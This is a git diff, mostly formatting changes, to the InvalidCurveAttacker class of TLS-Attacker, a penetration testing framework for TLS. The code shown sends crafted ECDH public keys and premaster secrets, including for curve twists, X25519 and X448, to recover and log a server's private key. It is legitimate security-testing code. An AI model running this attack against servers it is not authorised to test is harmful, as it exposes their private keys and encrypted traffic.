@@ -1,11 +1,10 @@
 /**
  * TLS-Attacker - A Modular Penetration Testing Framework for TLS
  *
- * Copyright 2014-2020 Ruhr University Bochum, Paderborn University,
- * and Hackmanit GmbH
+ * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
  *
- * Licensed under Apache License 2.0
- * http://www.apache.org/licenses/LICENSE-2.0
+ * Licensed under Apache License, Version 2.0
+ * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
 
 package de.rub.nds.tlsattacker.attacks.impl;
@@ -109,13 +108,12 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     @Override
     public void executeAttack() {
         Config tlsConfig = getTlsConfig();
-        LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getDefaultSelectedNamedGroup()
-            .name());
+        LOGGER.info("Executing attack against the server with named curve {}",
+            tlsConfig.getDefaultSelectedNamedGroup().name());
         EllipticCurve curve = CurveFactory.getCurve(tlsConfig.getDefaultSelectedNamedGroup());
         RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(tlsConfig, curve);
-        ICEAttacker attacker =
-            new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations(),
-                tlsConfig.getDefaultSelectedNamedGroup());
+        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations(),
+            tlsConfig.getDefaultSelectedNamedGroup());
         BigInteger result = attacker.attack();
         LOGGER.info("Resulting plain private key: {}", result);
         String privateKeyFile = generatePrivateKeyFile(result, tlsConfig);
@@ -193,9 +191,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                 premasterSecret = sharedPoint.getFieldX().getData();
                 if (config.isCurveTwistAttack()) {
                     // transform back from simulated x-only ladder
-                    premasterSecret =
-                        premasterSecret.multiply(config.getCurveTwistD().modInverse(curve.getModulus())).mod(
-                            curve.getModulus());
+                    premasterSecret = premasterSecret.multiply(config.getCurveTwistD().modInverse(curve.getModulus()))
+                        .mod(curve.getModulus());
                     if (config.getNamedGroup() == NamedGroup.ECDH_X25519
                         || config.getNamedGroup() == NamedGroup.ECDH_X448) {
                         // transform to Montgomery domain
@@ -205,7 +202,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                         premasterSecret = montPoint.getFieldX().getData();
                     }
                 }
-                if (config.getNamedGroup() == NamedGroup.ECDH_X25519 || config.getNamedGroup() == NamedGroup.ECDH_X448) {
+                if (config.getNamedGroup() == NamedGroup.ECDH_X25519
+                    || config.getNamedGroup() == NamedGroup.ECDH_X448) {
                     // apply RFC7748 encoding
                     RFC7748Curve rfcCurve = (RFC7748Curve) CurveFactory.getCurve(config.getNamedGroup());
                     premasterSecret = new BigInteger(1, rfcCurve.encodeCoordinate(premasterSecret));
@@ -220,9 +218,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
 
         EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
         ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
-        Point basepoint =
-            new Point(new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()), new FieldElementFp(
-                config.getPublicPointBaseY(), curve.getModulus()));
+        Point basepoint = new Point(new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()),
+            new FieldElementFp(config.getPublicPointBaseY(), curve.getModulus()));
         byte[] serialized;
         if (curve instanceof RFC7748Curve) {
             serialized = ((RFC7748Curve) curve).encodeCoordinate(basepoint.getFieldX().getData());
@@ -232,9 +229,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         }
         serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
         ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
-        byte[] explicitPMS =
-            BigIntegers.asUnsignedByteArray(ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length,
-                premasterSecret);
+        byte[] explicitPMS = BigIntegers
+            .asUnsignedByteArray(ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length, premasterSecret);
         pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));
 
         WorkflowTrace trace;
@@ -257,12 +253,11 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     private WorkflowTrace prepareRegularTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms,
         byte[] explicitPMS, Config individualConfig) {
         if (individualConfig.getHighestProtocolVersion() != ProtocolVersion.TLS13) {
-            individualConfig.setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCipherSuites()
-                .get(0));
+            individualConfig
+                .setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCipherSuites().get(0));
         }
-        WorkflowTrace trace =
-            new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
-                RunningModeType.CLIENT);
+        WorkflowTrace trace = new WorkflowConfigurationFactory(individualConfig)
+            .createWorkflowTrace(WorkflowTraceType.HELLO, RunningModeType.CLIENT);
         if (individualConfig.getHighestProtocolVersion().isTLS13()) {
 
             // replace specific receive action with generic
@@ -288,9 +283,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                 new ChangeCipherSpecMessage(individualConfig), new FinishedMessage(individualConfig)));
             trace.addTlsAction(new GenericReceiveAction());
 
-            ECDHClientKeyExchangeMessage message =
-                (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
-                    HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
+            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil
+                .getFirstSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
             message.setPublicKey(serializedPublicKey);
             message.prepareComputations();
             message.getComputations().setPremasterSecret(pms);
@@ -303,9 +297,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         byte[] explicitPMS, Config individualConfig) {
         WorkflowTrace trace;
         if (individualConfig.getHighestProtocolVersion().isTLS13()) {
-            trace =
-                new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(WorkflowTraceType.HANDSHAKE,
-                    RunningModeType.CLIENT);
+            trace = new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(WorkflowTraceType.HANDSHAKE,
+                RunningModeType.CLIENT);
             trace.addTlsAction(new ReceiveAction(ActionOption.CHECK_ONLY_EXPECTED, new NewSessionTicketMessage(false)));
             trace.addTlsAction(new ResetConnectionAction());
 
@@ -332,14 +325,12 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                 trace.addTlsAction(action);
             }
         } else {
-            individualConfig.setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCipherSuites()
-                .get(0));
-            trace =
-                new WorkflowConfigurationFactory(individualConfig).createWorkflowTrace(
-                    WorkflowTraceType.CLIENT_RENEGOTIATION_WITHOUT_RESUMPTION, RunningModeType.CLIENT);
-            ECDHClientKeyExchangeMessage message =
-                (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getLastSendMessage(
-                    HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
+            individualConfig
+                .setDefaultSelectedCipherSuite(individualConfig.getDefaultClientSupportedCipherSuites().get(0));
+            trace = new WorkflowConfigurationFactory(individualConfig)
+                .createWorkflowTrace(WorkflowTraceType.CLIENT_RENEGOTIATION_WITHOUT_RESUMPTION, RunningModeType.CLIENT);
+            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil
+                .getLastSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
             message.setPublicKey(serializedPublicKey);
             message.prepareComputations();
             message.getComputations().setPremasterSecret(pms);
@@ -366,12 +357,10 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         } else {
             intendedCurve = (EllipticCurveOverFp) CurveFactory.getCurve(config.getNamedGroup());
         }
-        BigInteger modA =
-            intendedCurve.getFieldA().getData().multiply(config.getCurveTwistD().pow(2))
-                .mod(intendedCurve.getModulus());
-        BigInteger modB =
-            intendedCurve.getFieldB().getData().multiply(config.getCurveTwistD().pow(3))
-                .mod(intendedCurve.getModulus());
+        BigInteger modA = intendedCurve.getFieldA().getData().multiply(config.getCurveTwistD().pow(2))
+            .mod(intendedCurve.getModulus());
+        BigInteger modB = intendedCurve.getFieldB().getData().multiply(config.getCurveTwistD().pow(3))
+            .mod(intendedCurve.getModulus());
         EllipticCurveOverFp twistedCurve = new EllipticCurveOverFp(modA, modB, intendedCurve.getModulus());
         config.setTwistedCurve(twistedCurve);
         return twistedCurve;
@@ -389,8 +378,9 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
             if (!task.isHasError()) {
                 foundExecutedAsPlanned = true;
                 if (!(WorkflowTraceUtil.getLastReceivedMessage(trace) != null
-                    && WorkflowTraceUtil.getLastReceivedMessage(trace).isHandshakeMessage() && ((HandshakeMessage) WorkflowTraceUtil
-                        .getLastReceivedMessage(trace)).getHandshakeMessageType() == HandshakeMessageType.FINISHED)) {
+                    && WorkflowTraceUtil.getLastReceivedMessage(trace).isHandshakeMessage()
+                    && ((HandshakeMessage) WorkflowTraceUtil.getLastReceivedMessage(trace)).getHandshakeMessageType()
+                        == HandshakeMessageType.FINISHED)) {
                     LOGGER.info("Received no finished Message using secret" + task.getAppliedSecret());
                 } else {
                     LOGGER.info("Received a finished Message using secret: " + task.getAppliedSecret()
@@ -450,7 +440,7 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
 
     /**
      * @param responsePairs
-     * the responsePairs to set
+     *                      the responsePairs to set
      */
     public void setResponsePairs(List<FingerprintSecretPair> responsePairs) {
         this.responsePairs = responsePairs;
